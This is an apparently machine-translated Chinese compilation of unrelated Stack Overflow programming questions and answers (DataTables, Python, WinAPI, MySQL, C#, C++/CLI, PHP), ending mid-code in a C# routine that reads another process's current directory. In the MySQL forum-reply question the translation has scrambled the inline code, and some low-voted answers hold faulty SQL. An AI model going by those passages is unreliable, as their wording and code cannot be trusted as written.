由于 tabletools 对我不起作用，由于它使用闪存和一些不适合我的情况的行为，我正在尝试编写一个 excel 导出。我已经提取了所有必要的单元格信息，但是 DataTables 对标题做了一些奇怪的事情。

假设 listTable 的 div （这是通用的，但适用于示例）我已经尝试过

```
$('#listTable').dataTable().fnSettings().nTable.getElementsByTagName('thead') 
```

这让我得到了表格标题行，但它已被更改。

```
<th class=​"sorting" role=​"columnheader" tabindex=​"0" 
aria-controls=​"listTable" rowspan=​"1" colspan=​"1" 
style=​"width:​ 130px;​ padding-top:​ 0px;​ padding-bottom:​ 0px;​ 
border-top-width:​ 0px;​ border-bottom-width:​ 0px;​ height:​ 0px;​" 
aria-label=​"Email Recipients:​ activate to sort column ascending">​&lt;/th>​ 
```

这很好，除了原始标题文本已被删除，正是我需要的东西。

查看 DOM，它显示有两个实际的表，其中一个包含单元格数据，另一个是用“datatables_scrollHeadInner”类 div 封装的新表。（如果我在一个页面上有多个表，那么在提供通用解决方案时会出现问题。）

虽然我认为我有一个 hackaround 解决方案（从 aria-label 中提取并用冒号分隔，并且从不在标题中使用冒号；或者做一些尴尬的 jquery 导航），但我想知道如何更优雅地提取数据表中的标头。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-21T17:56:58.323

试试这个来获取标题行：

```
var nRow =  $('#myDataTable thead tr')[0]; 
```

列标题名称将在 nRow.cells[index].innerText 中。

看到这个 jsFiddle：http: [//jsfiddle.net/h3U7f/](http://jsfiddle.net/h3U7f/)

**编辑 sScrollX**
试试这个：

```
var columns = $('#myDataTable').dataTable().dataTableSettings[0].aoColumns;
$.each(columns, function(i,v) { alert(v.sTitle); }); 
```

见：http: [//jsfiddle.net/UCYCt/](http://jsfiddle.net/UCYCt/)

# python - Python：如何导入 ascii 字符

> ID：16110897
> 
> 赞同：0
> 
> 时间：2013-04-19T18:05:37.723
> 
> 标签：python, ascii, python-2.x

对于我正在制作的电子邮件客户端的密码输入字段，我认为让密码显示随机字符会很酷。由于我**不想**写下所有 ascii 字符的字典，我想知道是否有一个模块可以导入来获取它。我对代码的想法是这样的：

```
import random
import char_set #All ascii characters

def random_char():

    char_select = random.randrange(len(char_set))

    char_choice = char_set[char_select]

    return char_choice 
```

**注意：**这必须是跨平台的，因为我在 Mac OSX、Windows 和 Debian (Raspberry Pi) 上运行。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T18:07:48.537

整个 ASCII 集：

```
In [22]: "".join(chr(x) for x in range(128))
Out[22]: '\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f' 
```

如果你想要可打印的 ascii 字符：

```
In [9]: "".join(chr(x) for x in range(32,127))
Out[9]: ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~' 
```

或者如果你只想要字母：

```
In [10]: import string

In [11]: string.ascii_letters
Out[11]: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' 
```

`string.printable`也是一个选项，它包含 5 个不在范围内的额外字符（32,127）：

```
In [39]: s1=set(x for x in string.printable)

In [40]: s2=set(chr(x) for x in range(32,127))

In [41]: s1-s2
Out[41]: set(['\t', '\x0b', '\n', '\r', '\x0c']) 
```

![ASCII 表](https://i.stack.imgur.com/RJu8n.gif)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:08:32.743

该`string`模块包含许多您可以使用的常量：`string.letters`、`string.numbers`、`string.punctuation`等 `string.printable`似乎在很大程度上是您想要的。

如果您不想使用模块，就这样做`printable_chars = "".join(chr(c) for c in xrange(33, 127))`（这会故意排除空间和擦掉）。

# c++ - 如何隐藏鼠标光标？

> ID：16110898
> 
> 赞同：-3
> 
> 时间：2013-04-19T18:05:41.413
> 
> 标签：c++, windows, winapi

我想问是否有人可以为我提供一个 c++ 代码，在该代码中我可以在按下特定键时隐藏/显示鼠标指针。我发现几个只为 TURBO C++ 编写的代码，没有一个可以使用 dev 编译和运行c++ 甚至视觉 c++ ..

我尝试运行我在 Dev C++ 中找到的代码，但我只得到很多错误和不兼容性。

我还发现了几篇文章说我可以使用函数 ShowCursor 但它不起作用..

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-22T13:05:36.417

事实上，隐藏光标可能是一项艰巨的任务，具体取决于您想要实现的目标。如果您正在使用 WinAPI 编写 GUI 应用程序，这非常容易。

只需调用 ShowCursor(false); 但是，在某些情况下，once 可能无法正常工作，因为 ShowCursor 函数仅“设置内部显示计数器”。光标一直显示，直到这个计数器小于 0（见[msdn](http://msdn.microsoft.com/en-us/library/windows/desktop/ms648396%28v=vs.85%29.aspx)就可以了）。你可以尝试这样的事情：

```
while(ShowCursor(false)>=0); 
```

以确保计数器低于 0。但是，如果您使用的是 Windows 7 等较新的 Windows 版本，这只会将光标隐藏在您的应用程序窗口中。在整个系统中隐藏光标可能会变得更加困难。

如果您正在编写控制台应用程序 ShowCursor 就我测试它不会显示任何效果。使用以下代码：

```
while(ShowCursor(false)>=0);    
std::cout<<ShowCursor(false)<<std::endl;
std::cout<<ShowCursor(true)<<std::endl; 
```

我们可以看到，计数器肯定低于 0，但仍显示光标。到目前为止，我还没有想出解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-23T04:43:33.657

如果您查看 SetCursor 函数的文档，将光标设置为 NULL 句柄（例如 SetCursor(NULL)）会将光标从屏幕上移除。

# wpf - 在 wpf 中加载窗口时使用等待图标

> ID：16110901
> 
> 赞同：1
> 
> 时间：2013-04-19T18:05:50.337
> 
> 标签：wpf

我正在编写一个 wpf 应用程序，它在单击按钮时从 excel 表中提取数据并加载另一个窗口，其中存在显示结果的数据网格。

现在加载第二个窗口需要 10-12 秒，在此期间我的应用程序冻结。现在我想要的是显示一个小的圆形带状按钮，它将旋转并显示“请稍候”文本。这将显示在第一个窗口的中心，第一个窗口的其他内容将变暗。

加载第二个窗口后，第一个窗口关闭。请告诉我如何做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T05:35:15.217

问题已解决。非常感谢你的帮助。以下是我使用的代码。

```
 namespace ScoreX
    {

        public partial class Score : Window
        {
          Applications ap;
          public Score()
          {
            InitializeComponent();
           }

       private void Window_Loaded_1(object sender, RoutedEventArgs e)
         {
        //cb is Circular progress bar
          cbProgress.Visibility = Visibility.Hidden;
         //Some codes
          }

        private void btnProceed_Click(object sender, RoutedEventArgs e)
          {
       //Some lines of Codes
        Thread t1 = new Thread(new ThreadStart(CalculateData));
         t1.SetApartmentState(ApartmentState.STA);
         t1.Start();
         cbProgress.Visibility = Visibility.Visible;

          }

       private void CalculateData()
        {
       //Some codes

        Dispatcher.Invoke(DispatcherPriority.Normal, (Action)delegate()
        {

            ap = new Applications();
            this.Close();
            ap.ShowDialog();

        }
        );

    } 
```

# mysql - 不能删除除第一条以外的所有记录

> ID：16110906
> 
> 赞同：-1
> 
> 时间：2013-04-19T18:06:02.703
> 
> 标签：mysql, sql, sql-delete

我正在尝试删除除第一个用户之外的某个用户的所有记录，但是我收到此错误：

# 1093 - 您不能在 FROM 子句中指定目标表“历史记录”进行更新

我不明白问题出在哪里，而且我在 SO 中发现了一个类似的问题，提出了相同的解决方案。这是我的查询：

```
DELETE FROM `History` WHERE ID = '3' AND Date NOT IN (SELECT min(Date) FROM `History` WHERE ID = '3') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:11:02.173

尝试将其转换为`JOIN`

```
DELETE  a
FROM    History a
        LEFT JOIN History b
            ON a.Date = b.Date AND
                b.ID = 3
WHERE   b.date IS NULL AND
        a.ID = 3 
```

*在执行上述语句之前，请先备份表。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:16:35.570

请尝试以下查询一次

```
 DELETE FROM `History` main WHERE main.ID = '3' 
      AND main.Date NOT IN 
           (SELECT min(inn.Date) FROM `History` WHERE main.ID = inn.id) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T18:29:48.380

这是解决此问题的另一种方法，通过将子查询包装在子查询的另一层中。MySQL 生成中间查询，以防止此错误：

```
DELETE FROM `History`
    WHERE ID = '3' AND
           Date NOT IN (select mindate
                        from (SELECT min(Date) as mindate FROM `History` WHERE ID = '3')
                       ) 
```

# php - 使用 PHP 访问对象变量

> ID：16110907
> 
> 赞同：4
> 
> 时间：2013-04-19T18:06:03.827
> 
> 标签：php, object

在 PHP 中访问对象中的变量的正确方法是什么？这些似乎不起作用。

```
$response = $wepay->request('checkout/create', array(
    'account_id'        => $account_id,
    'amount'            => '24.95',
    'short_description' => 'A brand new soccer ball',
    'type'              => 'GOODS',
    'mode'              => 'regular'

));

// display the response
print_r($response);
//prints stdClass Object ( [checkout_id] => 466761864 [checkout_uri] => https://stage.wepay.com/api/checkout/466761864/6c60270d )

echo $response[checkout_id]; //nothing
echo $response->$checkout_id; //nothing
var_dump(get_object_vars($response));  //nothing 
```

我只需要从 $response 获取 [checkout_id] 和 [checkout_uri]。我是 php 对象的新手，但是环顾四周，这些都是人们所说的方法，他们只是在这种情况下不起作用。对不起，如果这很简单。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-19T18:07:37.310

使用`->`操作符访问对象属性时，属性名称不得以`$`.

这将为您工作：

```
echo $response->checkout_id; 
```

你可以按照[说明书](http://php.net/manual/en/sdo.sample.getset.php)

# playframework - 如何将 authbind 添加到我的 Play Framework 启动脚本（使用“play stage”生成）？

> ID：16110908
> 
> 赞同：1
> 
> 时间：2013-04-19T18:06:12.477
> 
> 标签：playframework, playframework-2.0, sbt, upstart

我`authbind`用来允许我的 Play Framework 应用程序在以非 root 用户身份运行时绑定到端口 80。

我的目标/启动脚本需要看起来像这样才能工作：

```
#!/usr/bin/env sh

exec authbind --deep java $@ -cp "`dirname $0`/staged/*" play.core.server.NettyServer `dirname $0`/.. 
```

目前我正在手动修改这个生成的文件（呃！）。我找不到一种优雅的方式来在 java 命令之前`play stage`自动插入。`authbind --deep`

这个`target/start`脚本是从一个 Upstart 脚本启动的，我试过把`authbind --deep`它放在那里，但这似乎不起作用。

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T08:10:17.203

调整您的项目/Build.scala 文件：

```
lazy val main = play.Project(appName, appVersion, appDependencies).settings(
    playStage <<= (playStage, baseDirectory) map {(stageCommand, baseDir) =>
      val content = """#!/usr/bin/env sh
                      |
                      |exec authbind --deep java $@ -cp "`dirname $0`/staged/*" play.core.server.NettyServer `dirname $0`/..""".stripMargin
      IO.write(baseDir / "target" / "start", content)
      stageCommand
    }
  ) 
```

这将覆盖播放阶段任务并编写自定义启动脚本文件。

# c# - 为什么 ExecuteNonQuery() 不起作用？

> ID：16110913
> 
> 赞同：-3
> 
> 时间：2013-04-19T18:06:27.963
> 
> 标签：c#

```
SqlCommand cmd1=new SqlCommand(query);
cmd1.ExecuteNonQuery(); 
```

当我执行代码时，它说连接未初始化。然后，我将代码更改为：

```
cmd1.ExecuteNonQyery(conn); 
```

这被标记为错误。然后我 make`conn.Open()`然后它说连接没有初始化。我应该怎么办？先感谢您。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:08:12.877

您需要设置命令的连接属性。

```
SqlCommand cmd1 = new SqlCommand(query);
cmd1.Connection = conn;
cmd1.ExecuteNonQuery(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:08:04.360

正如错误消息试图告诉您的那样，您需要设置命令的连接：

```
cmd1.Connection = something; 
```

您还应该使用该`using`语句处理连接和命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T18:08:12.487

你需要告诉你`SqlCommand`的`SqlConnection`

即试试这个

```
 SqlCommand cmd1=new SqlCommand(query,conn);
   cmd1.ExecuteNonQuery(); 
```

# c++ - 托管代码中使用的 STL 向量

> ID：16110914
> 
> 赞同：2
> 
> 时间：2013-04-19T18:06:30.633
> 
> 标签：c++, visual-c++, stl, managed-c++

操作系统：xp
IDE：VS 2008
在我用 Visual C++ 做的项目中，我已经声明了一个`std::vector`内部托管类

```
std::vector<pts> dataPoints;//this gives error c4368 : mixed type not allowed 
```

但这有效

```
std::vector<pts> * dataPoints;//a pointer to the vector 
```

然后我在免费商店中创建了这个向量，就像在托管类的构造函数中一样

```
dataPoints = new std::vector<pts>(noOfElements,pts());//which is not so attractive. 
```

我需要向量的原因是因为我正在读取文件`ifstream`并将这些值存储在向量中。
Q1）为什么我能够声明一个指向本机类型对象的指针（我猜）但不是一个对象？此外，在尝试向量之前，我尝试了托管数组

```
cli::array<Point> dataPoints //and i defined it later. 
```

但是当我这样做时

```
ifile >> dataPoints[i].X; 
```

它给出了一个错误 c2678：operator= 没有为`int`!! 重载。
Q2）为什么我不能在这里使用托管代码。起初我认为它可能是一个包装类 Int 但随后自动拆箱（转换运算符）应该处理它？还是 Point::X 是合格的`property`，因此不被认为是正常的`int`？我错过了什么？这就是我寻求解决方案的`vector`原因`pts` 。
`pts`如下

```
 struct pts
{
  int X, int Y;
  pts() : X(0),Y(0){}
  pts(int x,int y) : X(x),Y(y){}
};//this i created to store the data from the file. 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T19:20:50.407

托管类对象的一个​​重要属性是它们被垃圾收集器**移动。**当它压缩堆时会发生这种情况。这对本机 C++ 对象造成严重破坏，指向其成员的指针将变得无效。因此，作为一项规则，编译器禁止将本机非 POD 对象嵌入托管对象中。指针不是问题。

您对运算符的使用存在完全相同的问题`>>`。int 通过引用 operator>>() 来传递。如果垃圾收集器恰好在获取 int 引用的代码和调用操作符之间介入，那么灾难就会发生。一个简单的解决方法是通过局部变量的中间步骤：

```
int x;
ifile >> x;
dataPoint[i].X = x; 
```

之所以有效，是因为局部变量是稳定的并且不受垃圾收集的影响。

这在本机代码中都不是问题。请记住，您的 ref 类可以轻松调用本机函数。因此，将两者分开可能是有用的和/或必要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:47:31.567

您不能在托管类型中直接包含本机类型：这只是对 C++/CLI 的限制。我认为这可能与本机类型中指针的可能性有关。如果本机类型直接在托管类型中，那么当托管对象在垃圾收集期间被打乱时，这些指针将指向原始的，现在不正确的内存。

因此，本机对象需要在堆上，这样它的内部结构就不会被垃圾回收所改变。因此，您需要将向量作为指针保存，并适当地删除它。请注意，后者并非完全无关紧要，您需要对 C++/CLI（与 C# 略有不同）有所了解。请参阅[http://msdn.microsoft.com/en-us/library/ms177197(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms177197(v=vs.100).aspx)。

看看我最后一次这样做，在我的文件中，我有

```
public:
    !NetClass();
    ~NetClass() { this->!NetClass(); } // avoid arning C4461
private:
    class NativeImpl* const m_pImpl; // can't contain NativeImpldirectly 
```

在我的cpp文件中

```
NetClass::!NetClass()
{
    // implement finalizer in ref class
    delete m_pImpl;
} 
```

如果您要包含多个本机类，您可能只想在此处使用 pimpl 习惯用法。请参阅[为什么要使用“PIMPL”成语？](https://stackoverflow.com/questions/60570/why-should-the-pimpl-idiom-be-used).

最后，我上次这样做是很久以前的事了，我只是说当时对我有用的东西。如果你这样做，你真的需要知道你在做什么。我使用了一本名为[C++/CLI in Action](https://rads.stackoverflow.com/amzn/click/com/1932394818)的书，我会推荐这本书。

*编辑*

这篇关于 STL/CLR 的文章看起来很有趣：http: [//blogs.msdn.com/b/nikolad/archive/2006/06/16/stlclr-intro.aspx](http://blogs.msdn.com/b/nikolad/archive/2006/06/16/stlclr-intro.aspx)。去引用

> STL/CLR，最初称为 STL.NET，是标准模板库 (STL) 的实现，可以对托管类型的对象进行操作。VC++ 已经实现了 STL，但是它目前仅适用于本机类型。

（我真的不能帮助你的第二季度）

# php - 如何获取mysql中条目的计数

> ID：16110920
> 
> 赞同：0
> 
> 时间：2013-04-19T18:06:59.890
> 
> 标签：php, mysql

```
________________________________
|oc_ct_forum_reply              |
--------------------------------|
| forum_reply_id | forum_post_id|
|-------------------------------|
|  21            |  25          |
|  22            |  25          |
|  25            |  25          |
|  28            |  25          |
--------------------------------- 
```

我有一个名为`oc_ct_forum_reply`尝试`forum_reply_id`使用以下 sql 查询查找第一个表的表：

```
 SELECT forum_reply_id
    FROM oc_ct_forum_reply
   WHERE forum_post_id = 25
ORDER BY reply_added
   LIMIT 1
       ; 
```

我使用另一个来获取 forum_post_id 的回复总数：

```
 SELECT COUNT(*) AS total
    FROM oc_ct_forum_reply
   WHERE forum_post_id = 25
       ; 
```

我需要一个 sql 查询，它给我一个给定在属于给定`forum_reply_id`的排序s 中的位置。假设我提供25 和25，我希望查询作为其第三个条目返回，或者说我提供25 和28 的 a，我希望将值作为其第四个条目。我已经使用上面的两个查询尝试了各种组合。`forum_reply_id``forum_post_id``forum_post_id``forum_reply_id``3``forum_post_id``forum_reply_id``4`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T18:12:31.930

这应该工作

```
SELECT 
  t1.forum_reply_id,
  count(t2.forum_reply_id) as reply_number
FROM
  oc_ct_forum_reply t1
  JOIN oc_ct_forum_reply t2 ON ( t1.forum_reply_id >= t2.forum_reply_id AND t1.forum_post_id = t2.forum_post_id )
WHERE
  t1.forum_reply_id = 25
  AND t1.forum_post_id = 25
GROUP BY
  t1.forum_reply_id 
```

**[SQLFIDDLE](http://sqlfiddle.com/#!2/5df2f/6)**

## **在职的**

1.  `oc_ct_forum_reply t1`得到具有的行`forum_reply_id = 25 AND t1.forum_post_id = 25`

2.  然后，我做了一个`SELF JOIN`来获取**当前的reply_id的编号** （通过获取所有`forum_reply_id`小于或等于当前`t1.forum_reply_id`并且具有相同`forum_post_id`的行`t1` 然后将它们分组

上述动作 fetch `3 rows`，如

```
t1.forum_reply_id , t2.forum_reply_id 
-----------------------------
 25               , 21                
 25               , 22                
 25               , 25 
```

最后，我只是`GROUP BY t1.forum_reply_id`使用[**COUNT()**](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_count)聚合函数来显示`total rows`请求的礼物`forum_reply_id`（ 25 ）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:42:50.513

替代：

```
SELECT rownum FROM
(
SELECT @rownum:=@rownum+1 rownum, oc_ct_forum_reply.* 
FROM (SELECT @rownum:=0) r, oc_ct_forum_reply
) result_table
WHERE FORUM_REPLY_ID = 25; 
```

[http://sqlfiddle.com/#!2/5df2f/29](http://sqlfiddle.com/#!2/5df2f/29)

# visual-studio-2012 - 在 Visual Studio 2012 文件夹中添加选项到“添加...”

> ID：16110921
> 
> 赞同：0
> 
> 时间：2013-04-19T18:07:18.247
> 
> 标签：visual-studio-2012, plugins

我不小心做了 Windows 8 刷新（永远不要这样做！），现在在重新安装 VS2012 后，我在添加新文件时没有那么多选项。

特别是当我右键单击一个文件夹时，它给了我四个选项——JavaScript 文件、TypeScript 文件、HTML 文件和其他东西。任何人对 VS2012 的什么插件或工具使这个可用有一些方向？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-30T14:49:34.937

在更新到 VS2012 的最新更新并安装 Web Essentials 后，这似乎得到了修复。

# asp.net-mvc - 具有外键关系的 mvc 模型

> ID：16110924
> 
> 赞同：0
> 
> 时间：2013-04-19T18:07:26.120
> 
> 标签：asp.net-mvc, model-view-controller, asp.net-mvc-4, data-annotations

我在包含外来对象模型的模型中遇到数据注释验证问题。

让我们说

```
Class Foo
{
    public virtual Int Id {get; set;}

    [Required]       
    public virtual String Name {get; set;}
 }

 Class Bar
 {
    public virtual Int Id {get; set;}

    [Required]
    public virtual String AnotherName {get; set;}

    public virtual Foo foo  {get; set;}
 } 
```

创建 BAR 时，FOO 不是强制性/必需的。

但是当我尝试检查 BAR 的 HTTPPOST 中的 ModelState 时，它​​说模型状态无效，并报告 FOO 列丢失。

```
[HTTPPOST]
public ActionResult SaveBar(BAR bar)
{
if (ModelState.IsValid)
    SaveBar(bar);

} 
```

我已将 FOO 设置为 null，尝试过 TryUpdateModel，但仍然没有帮助。

**编辑** 我正在处理实体而不是查看模型

还有..如何告诉模型绑定器在绑定 BAR 时不要检查 FOO ......

**编辑** 修改示例..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T19:47:20.193

当您点击“SaveBar()”时，模型绑定器似乎将 Foo 实例化为 Bar 对象的成员。因此，正如您所期望的那样，Foo 上的属性验证会触发。

这就是我要做的：删除属性验证并走一条不同的路线，可能就像您从控制器操作调用的自定义验证方法一样，用于正常的“Foo”操作。“SaveBar()”可以检查 Foo 的默认状态并决定是否调用该验证，具体取决于。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:46:40.577

Don't use `[Required]` on your model's id. I'm not sure whether you're dealing with entities or view models here, but in general, the id should be allowed to be unset. In the case of entities, the id will not be set until it is saved to the database (typically) and in the case of a view model, you might be representing an entity that has not previously been saved (and thus has no id).

`[Required]` has only two real uses, so you should understand exactly what those are and then only apply the attribute accordingly:

1) On an entity, `[Required]` will imply NOT NULL. It really only makes sense on strings since every other scalar type is NOT NULL by default.

2) On a view model being used to accept form data from a POST. This will require that the field not be blank. If your id is not a form field being presented to the user for input (which I highly doubt it is), then it should *not* be required.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T20:28:59.643

@hgrathi，你不明白的是，一旦你在 Foo 中指定了 Name ， Foo 现在在 Bar 下是必需的。

解决此问题的一种方法是通过实现 IModelBinder 创建自定义模型绑定器。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-19T18:33:36.930

它不像你想象的那样工作。`ModelState`无效，因为您根据要求声明了 的字段`Foo`。如果您的视图不接受并传递值`Foo.Id`，`Foo.Name`那么您将得到一个无效的`ModelState`.

# ruby - 为什么我的代码无法加载 RNotify？

> ID：16110932
> 
> 赞同：-1
> 
> 时间：2013-04-19T18:07:45.567
> 
> 标签：ruby, rubygems

我是 Arch Linux 用户已有几年了，我喜欢使用 pacman-notifier 来让我及时更新我的​​盒子。

几周前 pacman-notifier 停止为我工作，并显示以下消息：

```
$ pacman-notifier
/usr/lib/ruby/2.0.0/rubygems/core_ext/kernel_require.rb:110:in `require': cannot load such file -- RNotify (LoadError)
from /usr/lib/ruby/2.0.0/rubygems/core_ext/kernel_require.rb:110:in `rescue in require'
from /usr/lib/ruby/2.0.0/rubygems/core_ext/kernel_require.rb:35:in `require'
from /usr/lib/ruby/site_ruby/2.0.0/pacman_notifier/gui/gtk.rb:2:in `<top (required)>'
from /usr/lib/ruby/2.0.0/rubygems/core_ext/kernel_require.rb:45:in `require'
from /usr/lib/ruby/2.0.0/rubygems/core_ext/kernel_require.rb:45:in `require'
from /usr/lib/ruby/site_ruby/2.0.0/pacman_notifier.rb:6:in `<top (required)>'
from /usr/lib/ruby/2.0.0/rubygems/core_ext/kernel_require.rb:45:in `require'
from /usr/lib/ruby/2.0.0/rubygems/core_ext/kernel_require.rb:45:in `require'
from /usr/bin/pacman-notifier:3:in `<main>' 
```

首先我认为 RNotify 包不在正确的位置，所以我搜索它：

```
$ locate rnotify
/opt/kde/include/kdirnotify.h
/opt/kde/include/kdirnotify_stub.h
/usr/lib/ruby/gems/2.0.0/gems/ruby-libnotify-0.5.1/doc/ext/rnotify_c.html
/usr/lib/ruby/gems/2.0.0/gems/ruby-libnotify-0.5.1/ext/rnotify.c
/usr/lib/ruby/gems/2.0.0/gems/ruby-libnotify-0.5.1/ext/rnotify.o
/usr/lib/ruby/gems/2.0.0/gems/ruby-libnotify-0.5.1/ext/rnotify.so
/usr/lib/ruby/gems/2.0.0/gems/ruby-libnotify-0.5.1/lib/rnotify.so 
```

但我认为我得到的输出是正确的。

我还尝试检查提到的`/usr/lib/ruby/site_ruby/2.0.0/pacman_notifier/gui/gtk.rb`内容，但由于我真的不知道要搜索什么，所以我放弃了。

谁能给我一个提示来解决我的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T20:11:38.007

我的猜测是 ruby​​-libnotify 不支持 Ruby 2。这可能不是您想要的答案，但您可以查看[libnotify gem](https://github.com/splattael/libnotify)。在我看来，它非常相似，但维护得更积极，它支持 Ruby 2。

# php - 使用 getJSON 连接到在线数据库

> ID：16110935
> 
> 赞同：1
> 
> 时间：2013-04-19T18:07:57.803
> 
> 标签：php, javascript, sql, json

当我把`var serviceURL = //localhost/services/`它工作并显示数据库时，但是当我把它放到网上时，服务器不工作。谁能帮我？我使用 PhoneGap 在 XCode 上工作。

这是我的 list.js getJSON

```
var serviceURL = "http://panchoslimi.bugs3.com/services/";

var employees;

$('#employeeListPage').bind('pageinit', function(event) {
getEmployeeList();
});

function getEmployeeList() {

    $.getJSON(serviceURL  + 'getDoctors.php',function(data){
    $('#employeeList li').remove();

    employees = data.items;

    $.each(employees, function(index, employee) {
        $('#employeeList').append('<li> <a href="DoctorDetails.html?id=' +    employee.id + '">' +
                                    '<h4> Dr. ' + employee.firstName + ' ' + employee.lastName + '</h4>' +
                '<p>' + employee.title + '</p>');
    });
    $('#employeeList').listview('refresh');

  });

     }
    <?php

    include 'config.php';

  $sql = "SELECT e.id, e.firstName, e.lastName, e.title, e.picture, count(r.id)  

 reportCount " .
"FROM employee e left join employee r on r.managerId = e.id " .
"GROUP BY e.id ORDER BY e.lastName, e.firstName";

    try {
$dbh = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);  
$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$stmt = $dbh->query($sql);  
$MMC = $stmt->fetchAll(PDO::FETCH_OBJ);
$dbh = null;
echo '{"items":'. json_encode($MMC) .'}';
    } catch(PDOException $M) {
echo '{"error":{"text":'. $M->getMessage() .'}}';
    }

    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:10:39.617

这似乎很可能是跨站点脚本，这就是它被阻止的原因。

请记住，如果您从您的计算机上运行该站点并尝试使用 javascript 访问另一个域，除非您使用 JSONP（Jason with Padding），否则它将无法正常工作。

请参阅以下内容：

*   [如何使用 JSONP 克服 XSS 问题？](https://stackoverflow.com/questions/2921242/how-to-use-jsonp-to-overcome-xss-issue)
*   [这个跨域 ajax 请求是如何工作的？](https://stackoverflow.com/questions/8775407/how-does-this-cross-domain-ajax-request-work)
*   [http://www.w3resource.com/JSON/JSONP.php](http://www.w3resource.com/JSON/JSONP.php)

# c# - 在 C# 中读取其他进程当前目录

> ID：16110936
> 
> 赞同：10
> 
> 时间：2013-04-19T18:07:58.083
> 
> 标签：c#, windows, winapi, pinvoke

我正在尝试获取所选进程的当前工作目录。我确信这是可能的，因为像 Process Explorer 这样的工具可以显示这些信息。我发现这些信息存储在 PEB 中。

此外，我发现了 Oleksiy 博客文章：[http](http://eazfuscator.blogspot.com/2011/06/reading-environment-variables-from.html) ://eazfuscator.blogspot.com/2011/06/reading-environment-variables-from.html ，但我所有的修改都完全没有。

所以我的问题是如何在 C# 中读取这些信息？如果 Oleksiy 代码是一个好方法，我应该如何修改他的代码来获取这些信息？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-22T08:41:47.140

正如其他人指出的那样，这完全没有记录，但这里有一段代码可以做到这一点（截至今天，它似乎有效）。当然，它需要以管理员身份运行。请注意，它适用于任何进程位数，32 位或 64 位（某些进程可能会报告访问被拒绝，甚至以管理员身份运行），任何编译目标（x86 或 x64）。它还能够读取命令行。使用风险自负！

```
// All offset values below have been tested on Windows 7 & 8 only
// but you can use WinDbg "dt ntdll!_PEB" command and search for ProcessParameters offset to find the truth, depending on the OS version
public static class ProcessUtilities
{
    public static string GetCurrentDirectory(int processId)
    {
        return GetProcessParametersString(processId, Environment.Is64BitOperatingSystem ? 0x38 : 0x24);
    }

    public static string GetCurrentDirectory(this Process process)
    {
        if (process == null)
            throw new ArgumentNullException("process");

        return GetCurrentDirectory(process.Id);
    }

    public static string GetCommandLine(int processId)
    {
        return GetProcessParametersString(processId, Environment.Is64BitOperatingSystem ? 0x70 : 0x40);
    }

    public static string GetCommandLine(this Process process)
    {
        if (process == null)
            throw new ArgumentNullException("process");

        return GetCommandLine(process.Id);
    }

    private static string GetProcessParametersString(int processId, int offset)
    {
        IntPtr handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processId);
        if (handle == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());

        int processParametersOffset = Environment.Is64BitOperatingSystem ? 0x20 : 0x10;
        try
        {
            if (Environment.Is64BitOperatingSystem && !Environment.Is64BitProcess) // are we running in WOW?
            {
                PROCESS_BASIC_INFORMATION_WOW64 pbi = new PROCESS_BASIC_INFORMATION_WOW64();
                int hr = NtWow64QueryInformationProcess64(handle, 0, ref pbi, Marshal.SizeOf(pbi), IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                long pp = 0;
                hr = NtWow64ReadVirtualMemory64(handle, pbi.PebBaseAddress + processParametersOffset, ref pp, Marshal.SizeOf(pp), IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                UNICODE_STRING_WOW64 us = new UNICODE_STRING_WOW64();
                hr = NtWow64ReadVirtualMemory64(handle, pp + offset, ref us, Marshal.SizeOf(us), IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                if ((us.Buffer == 0) || (us.Length == 0))
                    return null;

                string s = new string('\0', us.Length / 2);
